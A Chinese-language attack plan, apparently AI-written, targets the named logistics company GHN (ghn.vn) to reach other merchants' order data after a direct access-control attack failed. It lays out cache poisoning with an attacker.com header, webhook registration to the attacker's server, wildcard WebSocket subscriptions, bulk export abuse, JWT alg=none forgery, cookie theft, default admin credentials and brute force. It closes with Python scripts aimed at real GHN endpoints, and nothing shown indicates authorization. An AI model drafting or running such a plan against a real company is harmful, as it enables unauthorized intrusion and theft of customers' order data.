# 🎯 高级攻击向量 - 非常规思路

**核心理念**: 不直接攻击，寻找间接路径

---

## 💡 **思路转变**

### **传统思路 (已失败)**
```
Token → API → 修改shop_id → 访问其他订单 ❌
```

### **高级红队思路**
```
不直接攻击订单API
找到信息汇聚点/薄弱环节
通过侧信道/业务逻辑/第三方集成获取数据
```

---

## 🎯 **10个非常规攻击路径**

### **路径1: 统计/报表系统攻击** ⭐⭐⭐⭐⭐

```
假设:
- 报表系统可能聚合多个shop数据
- 统计API可能有不同的权限模型
- 管理后台可能有全局视图

攻击点:
1. /v2/report/global - 全局报表
2. /v2/statistics/system - 系统统计
3. /v2/dashboard/admin - 管理面板
4. /v2/analytics/* - 分析API
5. /v2/metrics/summary - 汇总指标

测试方法:
- 寻找聚合类API
- 测试不同role参数
- 尝试admin/manager角色切换
- 导出功能可能有不同权限
```

### **路径2: Webhook/Callback劫持** ⭐⭐⭐⭐⭐

```
假设:
- GHN需要回调第三方系统
- Webhook可能包含订单详情
- 回调参数可能可控

攻击点:
1. 订单状态变更webhook
2. 支付回调
3. 物流更新通知
4. 退货申请通知

测试方法:
- 注册webhook URL为自己的服务器
- 触发订单事件（创建、更新、取消）
- 观察回调中是否包含其他订单数据
- SSRF利用webhook URL参数
```

### **路径3: 通知/推送系统** ⭐⭐⭐⭐

```
假设:
- 推送通知可能包含订单信息
- Channel ID可能可预测
- 通知队列可能有竞态条件

攻击点:
1. /v2/notification/subscribe
2. Push token注册
3. WebSocket连接
4. SSE (Server-Sent Events)

测试方法:
- 注册多个设备的push token
- 订阅其他shop的通知channel
- WebSocket消息注入
- 竞态条件获取其他通知
```

### **路径4: 缓存投毒** ⭐⭐⭐⭐

```
假设:
- API响应可能被缓存
- 缓存键可能不包含shop_id
- CDN/代理层可能有问题

攻击点:
1. HTTP缓存键污染
2. CDN缓存投毒
3. Vary header绕过
4. 缓存键冲突

测试方法:
# 请求1（污染缓存）
GET /api/orders?shop_id=TARGET_SHOP
Host: ghn.vn
X-Forwarded-Host: attacker.com

# 请求2（受害者访问）
GET /api/orders?shop_id=VICTIM_SHOP
→ 可能返回缓存的TARGET_SHOP数据
```

### **路径5: 业务流程深度利用** ⭐⭐⭐⭐

```
场景1: 退货流程
- 申请退货时，可能需要原订单信息
- 退货单可能关联原订单
- 测试用其他shop订单号申请退货

场景2: 纠纷/投诉
- 投诉某个订单
- 客服系统可能展示订单详情
- 社会工程学+技术结合

场景3: 发票/收据
- 申请发票时提供订单号
- 系统可能直接返回订单信息
- 测试IDOR在发票系统

场景4: 合并/拆分订单
- 如果有合并订单功能
- 可能可以合并其他shop订单
- 拆分订单可能暴露信息
```

### **路径6: 第三方集成点** ⭐⭐⭐⭐⭐

```
可能的集成:
1. 支付网关 (Stripe, PayPal)
2. 物流公司API
3. 地图服务 (Google Maps)
4. 短信服务
5. 邮件服务
6. 分析平台 (Google Analytics, Mixpanel)

攻击方法:
- 这些第三方服务可能有自己的API
- GHN的订单ID可能在第三方系统中
- 直接查询第三方系统
- 第三方webhook可能泄露数据

例如:
# 物流追踪可能是公开的
GET https://logistics-partner.com/track?ghn_order=GY6PMLQP
→ 可能不需要GHN的token
```

### **路径7: 导出/下载功能滥用** ⭐⭐⭐⭐

```
假设:
- Excel/PDF导出可能有不同权限
- 批量导出可能绕过单次查询限制
- 导出任务可能是异步的，权限检查延迟

攻击点:
1. /v2/export/orders
2. /v2/download/report
3. /v2/batch/export

测试方法:
POST /v2/export/orders
{
  "shop_id": [1, 2, 3, ..., 10000],  // 批量
  "format": "excel",
  "async": true
}

# 或者利用导出功能的竞态条件
# 在权限检查前修改参数
```

### **路径8: WebSocket/实时功能** ⭐⭐⭐⭐

```
假设:
- 实时订单更新用WebSocket
- Channel订阅可能有问题
- 消息广播可能泄露

攻击点:
1. ws://ghn.vn/realtime
2. Socket.io channels
3. Pusher/Firebase channels

测试方法:
// 连接WebSocket
ws = new WebSocket("wss://ghn.vn/realtime");

// 订阅所有订单channel
ws.send(JSON.stringify({
  "action": "subscribe",
  "channel": "orders.*",  // 通配符
  "shop_id": "*"
}));

// 或尝试订阅具体的其他shop
ws.send(JSON.stringify({
  "action": "subscribe",
  "channel": "orders.shop_1"
}));
```

### **路径9: 时间窗口攻击** ⭐⭐⭐

```
假设:
- 新创建的订单在缓存更新前可见
- 状态变更时有短暂的权限窗口
- 定时任务可能暴露数据

攻击方法:
1. 监控新订单创建的时间窗口
2. 在权限更新前快速查询
3. 利用缓存不一致
4. 定时任务的中间状态

# 创建订单后立即查询（在权限更新前）
order = create_order()
# 0.001秒内
quick_query(order_id + 1)  // 可能访问到其他订单
```

### **路径10: 管理员模拟** ⭐⭐⭐⭐⭐

```
目标: 获取/伪造管理员token

方法1: JWT算法混淆
- 如果用JWT，测试alg=none
- RS256 → HS256降级攻击
- 使用公钥作为HS256密钥

方法2: Session固定
- 固定管理员session
- CSRF获取管理员token
- XSS (如果存在) 窃取admin cookie

方法3: OAuth/SSO漏洞
- 如果有单点登录
- 测试OAuth token混淆
- SAML注入

方法4: 默认管理员账户
- admin@ghn.vn / admin123
- 测试常见默认凭据
- 暴力破解弱密码
```

---

## 🚀 **优先级执行顺序**

### **第一优先级** (高成功率)

```
1. Webhook/Callback测试 ⭐⭐⭐⭐⭐
   - 立即可测试
   - 常见漏洞点
   
2. 第三方集成点 ⭐⭐⭐⭐⭐
   - 物流追踪可能公开
   - 绕过GHN权限
   
3. WebSocket/实时功能 ⭐⭐⭐⭐
   - Channel订阅问题
   - 消息广播泄露
```

### **第二优先级** (需要深入)

```
4. 统计/报表系统 ⭐⭐⭐⭐
   - 寻找聚合API
   - 权限模型差异
   
5. 业务流程利用 ⭐⭐⭐⭐
   - 退货/纠纷
   - 客服系统
   
6. 缓存投毒 ⭐⭐⭐⭐
   - CDN层攻击
   - 缓存键冲突
```

### **第三优先级** (需要条件)

```
7. 管理员模拟 ⭐⭐⭐⭐⭐
   - 需要找到admin endpoint
   - JWT/OAuth漏洞
   
8. 通知系统 ⭐⭐⭐
   - Push劫持
   - Channel预测
```

---

## 🎯 **具体可执行的测试**

### **测试1: 物流追踪公开查询**

```python
# 很多物流公司提供公开追踪
# GHN可能也有

test_urls = [
    "https://ghn.vn/track/{order_code}",
    "https://tracking.ghn.vn/{order_code}",
    "https://ghn.vn/public/track?code={order_code}",
]

# 无需token直接访问
for url in test_urls:
    r = requests.get(url.format(order_code="GY6PMLQP"))
    if r.status_code == 200:
        print("公开追踪可用!")
```

### **测试2: Webhook注册**

```python
# 注册自己的webhook
r = requests.post(
    "https://online-gateway.ghn.vn/shiip/public-api/v2/webhook/subscribe",
    headers={"token": TOKEN},
    json={
        "url": "https://your-server.com/webhook",
        "events": ["order.*", "all"]  # 尝试订阅所有事件
    }
)

# 然后触发订单事件，观察webhook接收的数据
```

### **测试3: WebSocket连接**

```python
import websocket

# 尝试连接WebSocket
ws = websocket.create_connection(
    "wss://online-gateway.ghn.vn/realtime",
    header={"token": TOKEN}
)

# 订阅所有订单
ws.send(json.dumps({
    "action": "subscribe",
    "channel": "orders",
    "shop_id": "*"  # 或不指定
}))

messages = []
for i in range(100):
    msg = ws.recv()
    messages.append(msg)
    # 检查是否收到其他shop的订单
```

---

## 💡 **关键洞察**

### **为什么这些方向可能成功？**

```
1. 不同的权限模型
   - API层严格，但报表层可能松散
   - 实时层可能没有完整验证
   
2. 第三方绕过
   - 第三方系统不受GHN控制
   - 可能有独立的查询接口
   
3. 异步/队列
   - Webhook/通知是异步的
   - 权限检查可能有延迟
   
4. 聚合点
   - 统计/报表需要看全局
   - 可能权限检查不够细
   
5. 缓存层
   - 缓存可能不包含shop_id
   - CDN层可能有配置问题
```

---

## 🎯 **下一步行动**

```
立即测试:
1. ✅ 公开追踪URL枚举
2. ✅ Webhook功能探测
3. ✅ WebSocket连接测试
4. ✅ 第三方物流API
5. ✅ 统计/报表API枚举

深入研究:
6. ❓ 业务流程完整分析
7. ❓ 缓存投毒可行性
8. ❓ 管理员端点发现

这些是真正的"非常规"思路
不是直接攻击，而是绕道
```

---

**这些才是顶级红队的思维方式！** 🔥
